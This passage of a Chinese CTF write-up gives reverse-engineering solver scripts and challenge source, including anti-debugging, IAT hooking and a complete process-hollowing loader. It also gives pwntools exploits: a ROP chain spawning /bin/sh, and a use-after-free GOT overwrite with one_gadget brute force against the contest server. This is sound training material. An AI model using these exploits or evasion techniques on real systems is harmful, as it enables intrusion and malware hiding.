  0x68, 0x27, 0x6B, 0xE2, 0xC0, 0xE0, 0x00, 0x80, 0x22, 0x27, 
 h 0xE1, 0xA1, 0x02, 0x27, 0x63, 0x4B, 0xA8, 0xE3]
b = "nctf"

s = []

for i in range(len(a)):
    for v3 in range(0x20,0x7f):
        a1 = v3
        a2 = ord(b[i%4])
        v2 = (~a2 | ~a1) & (~a2 | a1) & (a2 | a1) | (~a2 | ~a1) & (a2 | ~a1) & a2 & a1 | a2 & ~a1 | ~a2 & a1
        v2 = ((~(32 * v2) | ~(v2 >> 3)) & (~(32 * v2) | (v2 >> 3)) & (32 * v2 | (v2 >> 3)) | (~(32 * v2) | ~(v2 >> 3)) & (32 * v2 | ~(v2 >> 3)) & (32 * v2 | (v2 >> 3)))&0xff
        if(v2 == a[i]):
            s.append(v3)
            break
print("".join(chr(s[i]) for i in range(len(s))))

```
### re2
动态调试很容易出结果

```c
from base64 import *
a = [ 0x1D, 0x01, 0x0D, 0x14, 0x47, 0x69, 0x61, 0x64, 0x04, 0x28, 
  0x37, 0x54, 0x43, 0x06, 0x71, 0x7A, 0x03, 0x0C, 0x47, 0x2F, 
  0x5D, 0x79, 0x5F, 0x51, 0x04, 0x00, 0x1D, 0x01, 0x58, 0x7D, 
  0x04, 0x63, 0x04, 0x5B, 0x42, 0x07, 0x55, 0x46]
b = "nctf2020"
for i in range(len(a)):
    a[i] = a[i] ^ord(b[i%8])

table2 = "/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA"
table1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
print("".join(chr(a[i]) for i in range(len(a))))
c = []
for i in range(len(a)):
    for j in range(64):
        if(ord(table2[j])==a[i]):
            c.append(ord(table1[j]))
            break
s = "".join(chr(c[i]) for i in range(len(c)))
s +="=="
print(b64decode(s))
```
### re3
里面所有和字符串有关的我都加了混淆
主要是我写了exit回调函数，main函数是fake函数,sub_401080,sub_401C50
，加了一些简单的花指令，去除就行，首先通过中国剩余定理和二元一次方程组，求得
flag[3]="@"
flag[10]="_"
flag[15] = "-"
接着通过"push ebp,mov ebp,esp"的机器码xor得到flag的第一部分“cp1”
接着通过对desmc后的函数观察知道对flag的第二部分进行了aes加密，密钥是“nctf2020x1c66666”
接着在sub_401c50中发现对flag的第二部分(aes后的)和第三部分分别xor后比较，
xor的数是个伪随机数，可以通过动态调试得到，或者仿照写一个得到
源码奉上

```c
seed = flag[3]+flag[10]+flag[15]
void myrandomint(unsigned int seed)
{
	unsigned long long int a = 0x114514;
	unsigned long long int b = 2333;
	unsigned int c = seed;
	int m = 255;
	for (int i = 0; i < 16; ++i)
	{
		unsigned char tmp = (a * c + b) % m;
		section2[i] = section2[i] ^ tmp;
		c = tmp;
	//	printf("0x%x,",section2[i]);
	}
	cout << endl;
}
void myrandomint2(unsigned int seed)
{
	unsigned long long int a = 0x233333;
	unsigned long long int b = 3489;
	unsigned int c = seed;
	int m = 255;
	for (int i = 0; i < 8; ++i)
	{
		unsigned char tmp = (a * c + b) % m;
		section3[i] = section3[i] ^ tmp;//sec
		c = tmp;
//		printf("0x%x,", section3[i]);
	}

}
```
得到flag的第三部分"veryha36"和aes加密好的flag的第二部分，那么进行解密就行了

```c
from Crypto.Cipher import AES
key = "nctf2020x1c66666"
text = "\x8b\xda\xc4\x3b\x78\x42\x3d\x15\xa5\xef\xae\x92\xd6\xeb\xa8\x67"
#print(len(text))
aes = AES.new(key,AES.MODE_ECB)
flag = aes.decrypt(text)
print(flag)

```

### re4
main.cpp
```
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>   
#include <stdint.h>
#include <pthread.h>  
#include <time.h>
#include <windows.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment(lib, "pthreadVC2.lib")

#ifdef __cplusplus
#define INITIALIZER(f) \
        static void f(void); \
        struct f##_t_ { f##_t_(void) { f(); } }; static f##_t_ f##_; \
        static void f(void)
#elif defined(_MSC_VER)
#pragma section(".CRT$XCU",read)
#define INITIALIZER2_(f,p) \
        static void f(void); \
        __declspec(allocate(".CRT$XCU")) void (*f##_)(void) = f; \
        __pragma(comment(linker,"/include:" p #f "_")) \
        static void f(void)
#ifdef _WIN64
#define INITIALIZER(f) INITIALIZER2_(f,"")
#else
#define INITIALIZER(f) INITIALIZER2_(f,"_")
#endif
#else
#define INITIALIZER(f) \
        static void f(void) __attribute__((constructor)); \
        static void f(void)
#endif

DWORD WINAPI fuck1(void* args);
BOOL CheckDebug();
BOOL CALLBACK EnumWndProc(HWND hwnd, LPARAM lParam);
void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len);
void rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len);

HANDLE
WINAPI
mycreatethread(
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ SIZE_T dwStackSize,
    _In_ LPTHREAD_START_ROUTINE lpStartAddress,
    _In_opt_ __drv_aliasesMem LPVOID lpParameter,
    _In_ DWORD dwCreationFlags,
    _Out_opt_ LPDWORD lpThreadId
);
BOOL hook_iat(LPCSTR szDllName, LPTHREAD_START_ROUTINE pfnOrg, PROC pfnNew);
DWORD WINAPI check(void* args);
DWORD WINAPI finalcheck(void* args);
unsigned char flag[43];
unsigned char result[] = { 0xa3,0x4d,0x44,0x7f,0x53,0xd6,0xe9,0x88,0x4d,0x95,0x1a,0x72,0x1,0x3c,0x71,0x0,0xe8,0xce,0xa1,0xf8,0x51,0x48,0xf5,0xe9,0x6a,0x2,0x27,0xd8,0x96,0x7f,0x72,0xd6,0xf1,0xe9,0x9f,0xc6,0x5d,0x60,0xe4,0x10,0x64,0x99,0xa0 };

int main() {
    unsigned char input[44];
    printf("plz input your flag:");
    scanf("%43s", input);
    unsigned int temp;
    int i;
    _asm {
        mov         eax, fs: [0x30]
        _EMIT		0xeb
        _EMIT		0xff
        _EMIT		0xc0
        _EMIT		0x48
        movzx			eax, byte ptr[eax + 2]
        mov     temp, eax
    }
    //printf("%d", temp);
    //getchar();
    if (strlen((const char*)input) != 43)
    {
        printf("wrong length!");
        exit(0);
    }
    for (i = 0; i < 43; i++)
    {
        input[i] += temp;
        flag[i] = input[i];
    }
    HANDLE hThread1 = CreateThread(NULL, 0, check, NULL, 0, NULL);
    DWORD dwCode = ::WaitForSingleObject(hThread1, INFINITE);
    if (dwCode == WAIT_TIMEOUT)
    {
        printf("time out");
        exit(0);
    }
    HANDLE hThread2 = ::CreateThread(NULL, 0, finalcheck, NULL, 0, NULL);
    DWORD dwCode2 = ::WaitForSingleObject(hThread2, INFINITE);
    getchar();
    return 0;
}
DWORD WINAPI finalcheck(void* args)
{
    unsigned char a, b, c, temp1, temp2, temp;
    int i;
    for (i = 0; i < 43; i++)
    {
        a = flag[i];
        b = i;
        c = ~(a & b);
        temp1 = ~(c & a);
        temp2 = ~(c & b);
        flag[i] = ~(temp1 & temp2);
        if (flag[i] != result[i])
        {
            printf("error");
            exit(0);
        }
    }
    printf("win!");
    return 0;
}
DWORD WINAPI check(void* args)
{
    unsigned char s[256] = { 0 };//S-box
    unsigned char key[256] = "pisanbao";
    unsigned long len = 43;
    int i;
    rc4_init(s, (unsigned char*)key, 8);
    rc4_crypt(s, (unsigned char*)flag, len);
    return 0;
}

DWORD WINAPI fuck1(void* args)
{
    while (true)
    {
        if (IsDebuggerPresent())
        {
            exit(0);
        }
    }
    return 0;
}
INITIALIZER(initialize)
{
    //printf("init\n");
    HANDLE hThread1 = ::CreateThread(NULL, 0, fuck1, NULL, 0, NULL);
    if (CheckDebug())
    {
        exit(0);
    }
    LPTHREAD_START_ROUTINE g_pOrgFunc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"KERNEL32.dll"), "CreateThread");
    hook_iat("KERNEL32.dll", g_pOrgFunc, (PROC)mycreatethread);
    return;
}
BOOL CheckDebug()
{
    BOOL ret = FALSE;
    EnumWindows(EnumWndProc, (LPARAM)&ret);
    return ret;
}
BOOL CALLBACK EnumWndProc(HWND hwnd, LPARAM lParam)
{
    char cur_window[1024];
    GetWindowTextA(hwnd, cur_window, 1023);
    if (strstr(cur_window, "WinDbg") != NULL || strstr(cur_window, "x64_dbg") != NULL || strstr(cur_window, "IDA") != NULL || strstr(cur_window, "OllyDBG") != NULL || strstr(cur_window, "破解") != NULL)
    {
        *((BOOL*)lParam) = TRUE;
    }
    return TRUE;
}

BOOL hook_iat(LPCSTR szDllName, LPTHREAD_START_ROUTINE pfnOrg, PROC pfnNew)
{
    HMODULE hMod;
    LPCSTR szLibName;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    DWORD dwOldProtect, dwRVA;
    PBYTE pAddr;
    hMod = GetModuleHandle(NULL);
    pAddr = (PBYTE)hMod;
    pAddr += *((DWORD*)&pAddr[0x3C]);
    dwRVA = *((DWORD*)&pAddr[0x80]);
    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod + dwRVA);
    for (; pImportDesc->Name; pImportDesc++)
    {
        szLibName = (LPCSTR)((DWORD)hMod + pImportDesc->Name);
        if (!_stricmp(szLibName, szDllName))//对比导入表libname是否相同
        {
            pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc->FirstThunk);
            for (; pThunk->u1.Function; pThunk++)//遍历函数
            {
                if (pThunk->u1.Function == (DWORD)pfnOrg)
                {
                    VirtualProtect((LPVOID)&pThunk->u1.Function, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
                    pThunk->u1.Function = (DWORD)pfnNew;//hook
                    VirtualProtect((LPVOID)&pThunk->u1.Function, PAGE_EXECUTE_READWRITE, dwOldProtect, &dwOldProtect);
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

HANDLE
WINAPI
mycreatethread(
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ SIZE_T dwStackSize,
    _In_ LPTHREAD_START_ROUTINE lpStartAddress,
    _In_opt_ __drv_aliasesMem LPVOID lpParameter,
    _In_ DWORD dwCreationFlags,
    _Out_opt_ LPDWORD lpThreadId
)
{
    int result = 0;
    __asm
    {
        mov eax, fs: [30h]
        mov eax, [eax + 68h]
        and eax, 0x70
        mov result, eax
    }
    if (result != 0)
    {
        exit(0);
    }
    LPTHREAD_START_ROUTINE g_pOrgFunc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"KERNEL32.dll"), "CreateThread");
    hook_iat("KERNEL32.dll", (LPTHREAD_START_ROUTINE)mycreatethread, (PROC)g_pOrgFunc);
    HANDLE hThread1 = CreateThread((_In_opt_ LPSECURITY_ATTRIBUTES)lpThreadAttributes, (_In_ SIZE_T)dwStackSize, (_In_ LPTHREAD_START_ROUTINE)lpStartAddress, (_In_opt_ __drv_aliasesMem LPVOID)lpParameter, (_In_ DWORD)dwCreationFlags, (_Out_opt_ LPDWORD)lpThreadId);
    g_pOrgFunc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"KERNEL32.dll"), "CreateThread");
    hook_iat("KERNEL32.dll", g_pOrgFunc, (PROC)mycreatethread);
    return hThread1;
}
void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{
    int i = 0, j = 0;
    char k[256] = { 0 };
    unsigned char tmp = 0;

    for (i = 0; i < 256; i++)
    {
        s[i] = i;
        k[i] = key[i % Len];
    }

    for (i = 0; i < 256; i++)
    {
        j = (j + s[i] + k[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }
}
void rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len)
{
    int i = 0, j = 0, t = 0;
    unsigned long k = 0;
    unsigned char tmp;

    for (k = 0; k < Len; k++)
    {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
        t = (s[i] + s[j]) % 256;
        Data[k] ^= s[t];
    }
}
```
外面是Process Hollowing
```
#define _CRT_SECURE_NO_DEPRECATE
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>
#include <time.h>
#include <string.h>

void UnloadShell(HANDLE ProcHnd, unsigned long BaseAddr);
LPVOID GetLastSecData(LPSTR lpszFile, DWORD& fileSize);
LPVOID AllocShellSize(LPSTR shellDirectory, HANDLE shellProcess, LPVOID encryptFileBuffer);
VOID GetNtHeaderInfo(LPVOID pFileBuffer, DWORD& ImageBase, DWORD& ImageSize);
VOID GetEncryptFileContext(LPVOID pFileBuffer, DWORD& OEP, DWORD& ImageBase);
LPVOID FileBufferToImageBuffer(BYTE* decodebuffer, DWORD& size);
void DoRelocation(LPVOID pFileBuffer, void* OldBase, void* NewBase);
void shittfunc();
int main(int argc, char* argv[])
{
	printf("hope you can learn something from this\n");
	WCHAR shellDirectory[100]; //encode后程序这边有个坑，win32api通常是宽字符然而自己写的函数不需要
	DWORD encryptSize = 0;
	mbstowcs(shellDirectory, argv[0], 100);//宽字符转换
	LPVOID encryptFileBuffer = NULL;
	encryptFileBuffer = GetLastSecData(argv[0], encryptSize);
	/*
	这边可以写解密函数
	*/
	srand(233);
	int i;
	unsigned char key;
	for (i = 0; i < encryptSize; i++)
	{
		key = rand();
		*((BYTE*)encryptFileBuffer + i) ^= key;
	}
	//解密完成
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof(si);
	::CreateProcess(shellDirectory, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (!(pi.hProcess))
	{
		printf("路径不能有中文哦~~~\n");
		getchar();
		exit(0);
	}
	//int x = GetLastError();
	//printf("%d\n", x);
	char szTempStr[256] = { 0 };
	//sprintf(szTempStr, "process_information %x , %x \n", pi.hProcess, pi.hThread);仅用于验证是否成功创建进程
	CONTEXT contx;
	contx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &contx);
	//int x = GetLastError();
	//printf("%d\n", x);
	DWORD dwEntryPoint = contx.Eax;
	DWORD baseAddress;
	TCHAR szBuffer[4] = { 0 };
	ReadProcessMemory(pi.hProcess, (LPCVOID)(contx.Ebx + 8), (LPVOID)&baseAddress, 4, NULL);
	//printf("挂起进程的线程Context.Eax:%p - Context.Ebx + 8:%p\n", contx.Eax, baseAddress);
	int* fileImageBase;
	fileImageBase = (int*)szBuffer;
	DWORD shellImageBase = *fileImageBase;
	UnloadShell(pi.hProcess, shellImageBase);
	LPVOID p = AllocShellSize(argv[0], pi.hProcess, encryptFileBuffer);
	DWORD pEncryptImageSize = 0;
	LPVOID pEncryptImageBuffer = FileBufferToImageBuffer((BYTE*)encryptFileBuffer, pEncryptImageSize);
	unsigned long old;
	//111
	DWORD* pPEB;
	pPEB = (DWORD*)contx.Ebx;

	WriteProcessMemory(pi.hProcess, &pPEB[2], &p, sizeof(DWORD), &old);
	//111 &pPEB[2]
	//WriteProcessMemory(pi.hProcess, (void*)(contx.Ebx + 8), &p, sizeof(DWORD), &old);
	if (WriteProcessMemory(pi.hProcess, p, pEncryptImageBuffer, pEncryptImageSize, &old))
	{
		DWORD encryptFileOEP = 0;
		DWORD encryptFileImageBase = 0;

		GetEncryptFileContext(encryptFileBuffer, encryptFileOEP, encryptFileImageBase);

		contx.ContextFlags = CONTEXT_FULL;

		contx.Eax = encryptFileOEP + (DWORD)p;
		//contx.Eip
		SetThreadContext(pi.hThread, &contx);

		LPVOID szBufferTemp = malloc(pEncryptImageSize);
		memset(szBufferTemp, 0, pEncryptImageSize);
		ReadProcessMemory(pi.hProcess, p, szBufferTemp, pEncryptImageSize, NULL);
		_asm {
			_EMIT		0xeb
			_EMIT		0xff
			_EMIT		0xc0
			_EMIT		0x48
		}
		if (IsDebuggerPresent())
		{
			shittfunc();
			exit(0);
		}
		ResumeThread(pi.hThread);
		CloseHandle(pi.hThread);
	}
	return 0;
}
void UnloadShell(HANDLE ProcHnd, unsigned long BaseAddr)
{
	typedef unsigned long(__stdcall* pfZwUnmapViewOfSection)(unsigned long, unsigned long);
	pfZwUnmapViewOfSection ZwUnmapViewOfSection = NULL;
	BOOL res = FALSE;
	HMODULE m = LoadLibraryA("ntdll.dll");
	if (m) {
		ZwUnmapViewOfSection = (pfZwUnmapViewOfSection)GetProcAddress(m, "ZwUnmapViewOfSection");

		if (ZwUnmapViewOfSection)
			res = (ZwUnmapViewOfSection((unsigned long)ProcHnd, BaseAddr) == 0);
		FreeLibrary(m);
	}
	else
	{
		printf("load library failed!!!\n");
		exit(0);
	}
	return;
}
LPVOID FileBufferToImageBuffer(BYTE* decodebuffer, DWORD& size)
{
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS pNTHeader = NULL;
	PIMAGE_FILE_HEADER pPEHeader = NULL;
	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader_LAST = NULL;


	pDosHeader = (PIMAGE_DOS_HEADER)decodebuffer;
	pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)decodebuffer + pDosHeader->e_lfanew);
	pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4);
	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);
	pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader->SizeOfOptionalHeader);
	pSectionHeader_LAST = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + (pPEHeader->NumberOfSections - 1) * 40);

	unsigned int fileLength = pSectionHeader_LAST->PointerToRawData + pSectionHeader_LAST->SizeOfRawData;
	size = pNTHeader->OptionalHeader.SizeOfImage;
	BYTE* pEncryptBuffer = (BYTE*)malloc(size);
	memset(pEncryptBuffer, 0, size);
	memcpy(pEncryptBuffer, decodebuffer, pNTHeader->OptionalHeader.SizeOfHeaders);
	int i;
	for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++)
	{
		memcpy(pEncryptBuffer + pSectionHeader->VirtualAddress, decodebuffer + pSectionHeader->VirtualAddress, pSectionHeader->SizeOfRawData);
		pSectionHeader++;
	}


	return pEncryptBuffer;
}
LPVOID GetLastSecData(LPSTR lpszFile, DWORD& fileSize)
{
	FILE* a = fopen(lpszFile, "rb");
	fseek(a, 0, SEEK_END);
	fileSize = ftell(a);
	fseek(a, 0, SEEK_SET);
	LPVOID pFileBuffer = calloc(1, fileSize);
	fread(pFileBuffer, fileSize, 1, a);
	fclose(a);
	if (!pFileBuffer)
	{
		printf("文件读取失败\n");
		return NULL;
	}


	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS pNTHeader = NULL;
	PIMAGE_FILE_HEADER pPEHeader = NULL;
	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader_LAST = NULL;


	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;
	pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader->e_lfanew);
	pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4);
	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);
	pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader->SizeOfOptionalHeader);
	pSectionHeader_LAST = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + (pPEHeader->NumberOfSections - 1) * 40);

	unsigned int fileLength = pSectionHeader_LAST->PointerToRawData + pSectionHeader_LAST->SizeOfRawData;
	fileSize = pSectionHeader_LAST->SizeOfRawData;
	LPVOID pEncryptBuffer = malloc(fileSize);
	memset(pEncryptBuffer, 0, fileSize);
	CHAR* pNew = (CHAR*)pEncryptBuffer;

	CHAR* pOld = (CHAR*)((DWORD)pFileBuffer + pSectionHeader_LAST->PointerToRawData);

	pEncryptBuffer = pOld;

	return pEncryptBuffer;
}
LPVOID AllocShellSize(LPSTR shellDirectory, HANDLE shellProcess, LPVOID encryptFileBuffer)
{
	typedef void* (__stdcall* pfVirtualAllocEx)(unsigned long, void*, unsigned long, unsigned long, unsigned long);
	pfVirtualAllocEx MyVirtualAllocEx = NULL;
	MyVirtualAllocEx = (pfVirtualAllocEx)GetProcAddress(GetModuleHandle((LPCWSTR)"Kernel32.dll"), "VirtualAllocEx"); //获取VirtualAllocEx 函数地址
	FILE* a = fopen(shellDirectory, "rb");
	fseek(a, 0, SEEK_END);
	unsigned long long fileSize = ftell(a);
	fseek(a, 0, SEEK_SET);
	LPVOID pShellBuffer = calloc(1, fileSize);
	fread(pShellBuffer, fileSize, 1, a);
	fclose(a);

	DWORD shellImageBase = 0;
	DWORD shellImageSize = 0;
	DWORD encryptImageBase = 0;
	DWORD encryptImageSize = 0;


	GetNtHeaderInfo(pShellBuffer, shellImageBase, shellImageSize);
	GetNtHeaderInfo(encryptFileBuffer, encryptImageBase, encryptImageSize);

	if (shellImageBase == 0 || shellImageSize == 0 || encryptImageBase == 0 || encryptImageSize == 0)
	{
		printf("分配空间失败\n");
		exit(0);
	}

	void* p = NULL;

	if (shellImageBase == encryptImageBase)
	{
		shellImageSize = (shellImageSize >= encryptImageSize) ? shellImageSize : encryptImageSize;

		p = VirtualAllocEx(shellProcess, (void*)shellImageBase, shellImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		//int x = GetLastError();
		//printf("%d\n", x);
	}


	if (p == NULL)
	{
		p = VirtualAllocEx(shellProcess, NULL, shellImageBase, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (p) 
		{
			//DoRelocation(encryptFileBuffer, (void*)encryptImageBase, p);
			return p;
		}
		else 
		{
			printf("分配空间失败\n");
			exit(0);
		}
	}


	return p;
}

void DoRelocation(LPVOID pFileBuffer, void* OldBase, void* NewBase)
{
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	unsigned int i,j=0;
	unsigned long* t;
	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;
	PIMAGE_NT_HEADERS peH = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader->e_lfanew);
	signed long Delta = (signed long)NewBase - peH->OptionalHeader.ImageBase;
	IMAGE_DATA_DIRECTORY relocations = (peH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	PIMAGE_BASE_RELOCATION p = (PIMAGE_BASE_RELOCATION)((DWORD)pFileBuffer + relocations.VirtualAddress);
	while (p->VirtualAddress + p->SizeOfBlock)
	{
		unsigned short* pw = (unsigned short*)((int)p + sizeof(*p));
		for (i = 0; i < (p->SizeOfBlock - sizeof(*p)) / sizeof(WORD); ++i)
		{
			if (((*pw) & 0xF000) == 0x3000) {
				t = (unsigned long*)((DWORD)(pFileBuffer)+p->VirtualAddress + ((*pw) & 0x0FFF));
				*t += Delta;
			}
			++pw;
		}
		p = (PIMAGE_BASE_RELOCATION)pw;
	}
}

VOID GetNtHeaderInfo(LPVOID pFileBuffer, DWORD& ImageBase, DWORD& ImageSize)
{
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS pNTHeader = NULL;
	PIMAGE_FILE_HEADER pPEHeader = NULL;
	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;

	if (!pFileBuffer)
	{
		printf("文件读取失败\n");
		return;
	}


	if (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)
	{
		printf("GetNtHeaderInfo:不是有效的MZ标志\n");
		free(pFileBuffer);
		return;
	}


	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;


	if (*((PDWORD)((DWORD)pFileBuffer + pDosHeader->e_lfanew)) != IMAGE_NT_SIGNATURE)
	{
		printf("GetNtHeaderInfo:不是有效的PE标志\n");
		free(pFileBuffer);
		return;
	}

	pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader->e_lfanew);


	pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4);


	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);

	ImageBase = pOptionHeader->ImageBase;
	ImageSize = pOptionHeader->SizeOfImage;

}

VOID GetEncryptFileContext(LPVOID pFileBuffer, DWORD& OEP, DWORD& ImageBase)
{
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS pNTHeader = NULL;
	PIMAGE_FILE_HEADER pPEHeader = NULL;
	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	//pFileBuffer= ReadPEFile(lpszFile);

	if (!pFileBuffer)
	{
		printf("文件读取失败\n");
		return;
	}


	if (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)
	{
		printf("GetEncryptFileContext:不是有效的MZ标志\n");
		free(pFileBuffer);
		return;
	}

	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;


	if (*((PDWORD)((DWORD)pFileBuffer + pDosHeader->e_lfanew)) != IMAGE_NT_SIGNATURE)
	{
		printf("GetEncryptFileContext:不是有效的PE标志\n");
		free(pFileBuffer);
		return;
	}

	pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader->e_lfanew);


	pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4);


	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);


	OEP = pOptionHeader->AddressOfEntryPoint;
	ImageBase = pOptionHeader->ImageBase;

}

void shittfunc()
{
	_asm {
		_EMIT		0xeb
		_EMIT		0xff
		_EMIT		0xc0
		_EMIT		0x48
	}
	unsigned char input[44];
	unsigned char aaa[] = { 102,109,99,100,127,118,105,88,109,104,121,114,51,82,99,110,105,115,119,76,109,122,99,72,121,107,127,68,107,111,113,113,71,126,3,99,7,101,5,3,104,10,87 };
	unsigned char bbb[] = "图形学考试要写个微信跳一跳出来，考试时间90分钟，有无大佬帮帮忙，zxd";
	printf("plz input your flag:");
	scanf("%43s", input);
	if (strlen((const char*)input) != 43)
	{
		printf("wrong length!");
		exit(0);
	}
	int i;
	for (i = 0; i < 43; i++)
	{
		input[i] ^= i;
		if (input[i] != aaa[i])
		{
			printf("error");
			exit(0);
		}
	}
	printf("win\n");
	printf((const char *)bbb);
	return;
}
```
把main.cpp编译后按照内存对齐加密放入decode.cpp编译后可执行文件新增的一个节就出完这题了//考图形学的时候出的题，可惜考完了还没有大佬教我怎么写跳一跳
具体加密是rc4 and xor 然后比较
建议输入一堆A吧结果和Axor拿出box然后xor密文就是flag

## PWN
### gogogo
golang pwn,简单的栈溢出,在各个输入的地方输入大量的数据,就能判断出在打印 主合取范式 时崩溃了,再gdb调试一下,就能计算出偏移 
ROPgadget --binary ./pwn --all |grep 'pop rdi' 
以这种形式,可以发现一些可以用的gadget,而golang是静态编译的,是存在syscall的汇编指令的,所以筛选出syscall 
之后则是一个简单的栈溢出,首先通过控制rdi,rsi,rdx三个寄存器,配合syscall即可往一个可写地址写入一个/bin/sh字符串 
之后再通过rax=59的SYS_execve 系统调用从而getshell
```python
from pwn import*
context.log_level = 'DEBUG'
p = process('./main')
#p = remote('42.192.180.50',25007)
pop_rdi_ret = 0x00000000004108BD
pop_rsi_ret = 0x000000000041724F
pop_rdx_ret = 0x0000000000468395
pop_rax_ret = 0x000000000040440D
syscall = 0x0000000000465AE5

payload  = '\x00'*0xA0
payload += p64(pop_rax_ret) + p64(0xC000000F00)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_ret) + p64(0xC000000100)
payload += p64(pop_rdx_ret) + p64(16)
payload += p64(pop_rax_ret) + p64(0)
payload += p64(syscall)
payload += p64(pop_rax_ret) + p64(0xC000000F00)
payload += p64(pop_rdi_ret) + p64(0xC000000100)
payload += p64(pop_rsi_ret) + p64(0xC000000F00)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall)
p.sendline(payload)
p.sendlineafter('Command:','2')
p.sendline('/bin/sh\x00')
p.interactive()
```

### bruteforce
漏洞是UAF,因为存在edit功能,所以修改后,就能劫持fastbin chunk,因为只能申请0x30大小的块,所以此处利用got表某些指针没有进行符号表定位前的0x40的字节申请从而控制got表,因为one_gadget中0xFXXXX 这两个偏移和read函数 可以存在一个内存页里面,所以通过爆破read函数的最后两个字节,让调用read函数的时候调用one_gadget即可getshell,概率1/16
```python
from pwn import*
def new():
	p.sendlineafter('choice:','1')
def free():
	p.sendlineafter('choice:','3')
def edit(content):
	p.sendlineafter('choice:','2')
	p.sendafter('note: ',content)
while True:
	p = process('./main')
	p = remote('42.192.180.50',25003)
	try:
		new()
		free()
		edit(p64(0x404028 + 2 - 8))
		new()
		new()
		edit('\x00'*6 + p64(0x4013E4) + p64(0) + '\x07\x42')
		p.sendlineafter('choice:\n','ls')
		data = p.recvline()
		break
		
	except:
		p.close()
		continue

p.interactive()
```

### fake_qiandao
我记得我当时测2.30的时候,one_gadget用不了,后面换成2.31居然能够利用one_gadget了,早知道不换libc了  
